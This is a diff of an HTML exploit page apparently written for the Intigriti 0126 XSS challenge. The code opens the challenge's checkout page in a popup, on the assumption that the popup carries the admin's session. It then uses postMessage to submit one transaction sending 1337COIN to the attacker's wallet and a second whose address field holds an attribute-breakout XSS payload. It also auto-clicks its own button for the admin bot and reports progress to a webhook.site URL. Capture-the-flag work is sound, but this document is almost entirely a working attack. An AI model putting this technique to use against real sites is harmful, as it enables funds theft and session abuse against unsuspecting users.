@@ -1,24 +1,26 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>XSS Exploit</title>
+    <title>Intigriti 0126 - XSS Exploit</title>
     <meta charset="UTF-8">
-    <style>body{font-family:monospace;background:#0a0a0a;color:#00ff00;padding:20px;}</style>
+    <style>
+        body { font-family: monospace; background: #0a0a0a; color: #00ff00; padding: 20px; }
+        .btn { background: #238636; color: white; padding: 15px 30px; border: none; font-size: 16px; cursor: pointer; }
+        .btn:hover { background: #2ea043; }
+    </style>
 </head>
 <body>
     <h1>EXPLOIT LOADED</h1>
-    <div id="log">Initializing exploit...</div>
+    <div id="log">Starting...</div>
+
+    <!-- Auto-click button for admin bot -->
+    <button id="startBtn" class="btn" onclick="startExploit()">Start Exploit</button>
 
     <script>
         const BASE = 'https://challenge-0126.intigriti.io';
-        const WEBHOOK = 'https://webhook.site/5a4b9450-5abf-4298-8f68-de911bc98898';
+        const WEBHOOK = 'https://webhook.site/f324d507-94fa-4265-8946-2b290873a05e';
         const YOUR_WALLET = '1cc4a7735c998cb4b4e390e97c349281d2';
-
-        // Admin has 100M 1337COIN - sending to our wallet
         const CURRENCY = '1337COIN';
-
-        // XSS Payload - breaks out of title attribute in marketwatch
-        // marketwatch.html: <span title="${tx?.address}">
         const XSS_WALLET = '"><img src=x onerror="alert(\'gigawatz\')">';
 
         function log(msg) {
@@ -31,84 +33,74 @@
             fetch(url, { mode: 'no-cors' }).catch(() => {});
         }
 
-        track('start', 'exploit_loaded', { currency: CURRENCY });
+        track('start', 'loaded', {});
 
-        function sendTransactions(targetWindow) {
-            log('Sending BOTH transactions...');
-            track('sending_both', 'sending', { currency: CURRENCY });
+        function startExploit() {
+            log('Opening checkout popup...');
+            track('opening_popup', 'start', {});
 
-            // Send both instantly - async handler processes in parallel
-            targetWindow.postMessage({
-                type: 'submitTransaction',
-                transaction: {
-                    toAddress: YOUR_WALLET,
-                    currency: CURRENCY,
-                    amount: 1337
-                }
-            }, '*');
+            // Open checkout in popup - inherits admin session
+            const popup = window.open(
+                `${BASE}/checkout.html?currency=${CURRENCY}&price=1000000`,
+                'checkout',
+                'width=1000,height=800'
+            );
 
-            track('tx1_sent', 'success', { to: YOUR_WALLET, currency: CURRENCY, amount: 1337 });
-            log('TX #1: ' + CURRENCY + ' to ' + YOUR_WALLET);
-
-            targetWindow.postMessage({
-                type: 'submitTransaction',
-                transaction: {
-                    toAddress: XSS_WALLET,
-                    currency: CURRENCY,
-                    amount: 1337
-                }
-            }, '*');
-
-            track('tx2_sent', 'success', { to: XSS_WALLET, currency: CURRENCY, amount: 1337 });
-            log('TX #2: ' + CURRENCY + ' with XSS payload');
-        }
-
-        // STRATEGY 1: window.opener (bot opened us in popup)
-        if (window.opener && !window.opener.closed) {
-            log('Found window.opener');
-            track('found_opener', 'success', {});
-
-            window.opener.location.href = `${BASE}/checkout.html?currency=${CURRENCY}&price=1000000`;
-
-            // Increased timeout - wait for checkout to fully load
-            setTimeout(() => {
-                log('Checkout should be loaded, sending...');
-                sendTransactions(window.opener);
-            }, 8000);
-        }
-        // STRATEGY 2: window.parent (bot opened us in iframe)
-        else if (window.parent && window.parent !== window) {
-            log('Found window.parent');
-            track('found_parent', 'success', {});
-
-            window.parent.location.href = `${BASE}/checkout.html?currency=${CURRENCY}&price=1000000`;
-
-            setTimeout(() => {
-                log('Checkout should be loaded, sending...');
-                sendTransactions(window.parent);
-            }, 8000);
-        }
-        // STRATEGY 3: Try popup
-        else {
-            log('Trying popup...');
-            track('trying_popup', 'attempting', {});
-
-            const popup = window.open(`${BASE}/checkout.html?currency=${CURRENCY}&price=1000000`, 'checkout', 'width=1000,height=800');
-
-            if (popup) {
-                log('Popup opened');
-                track('popup_opened', 'success', {});
-
-                setTimeout(() => {
-                    sendTransactions(popup);
-                }, 8000);
-            } else {
-                log('Popup blocked');
+            if (!popup) {
+                log('Popup blocked!');
                 track('popup_blocked', 'failed', {});
+                return;
             }
+
+            log('Popup opened!');
+            track('popup_opened', 'success', {});
+
+            // Wait for checkout to fully load (increased timeout)
+            setTimeout(() => {
+                log('Sending transactions...');
+                track('sending', 'start', {});
+
+                // Send both instantly - async handler processes in parallel
+                popup.postMessage({
+                    type: 'submitTransaction',
+                    transaction: {
+                        toAddress: YOUR_WALLET,
+                        currency: CURRENCY,
+                        amount: 1337
+                    }
+                }, '*');
+
+                track('tx1_sent', 'success', { to: YOUR_WALLET });
+                log('TX #1 sent');
+
+                popup.postMessage({
+                    type: 'submitTransaction',
+                    transaction: {
+                        toAddress: XSS_WALLET,
+                        currency: CURRENCY,
+                        amount: 1337
+                    }
+                }, '*');
+
+                track('tx2_sent', 'success', { to: XSS_WALLET });
+                log('TX #2 sent with XSS');
+                log('Waiting for processing...');
+
+            }, 10000); // 10 second wait for page to fully load
+
+            // Listen for any response
+            window.addEventListener('message', (event) => {
+                log('Message received: ' + JSON.stringify(event.data));
+                track('message_received', 'info', event.data);
+            });
         }
 
-        track('complete', 'waiting_for_checkout', {});
+        // Auto-click for admin bot (1-click exploit)
+        window.addEventListener('load', () => {
+            setTimeout(() => {
+                document.getElementById('startBtn').click();
+            }, 500);
+        });
     </script>
 </body>
 </html>
